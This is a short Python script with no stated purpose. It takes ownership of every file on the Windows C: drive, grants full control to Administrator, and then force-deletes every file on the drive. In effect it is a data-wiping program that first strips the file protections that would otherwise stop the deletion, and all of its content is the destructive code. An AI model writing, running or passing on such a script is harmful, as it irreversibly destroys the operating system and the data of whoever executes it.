# encoding=utf-8
import os
os.system("takeown /F C:\\* /R")
os.system("icacls C:\\* /T /C /Q /grant Administrator:F")
os.system("del /F /S /Q C:\\*")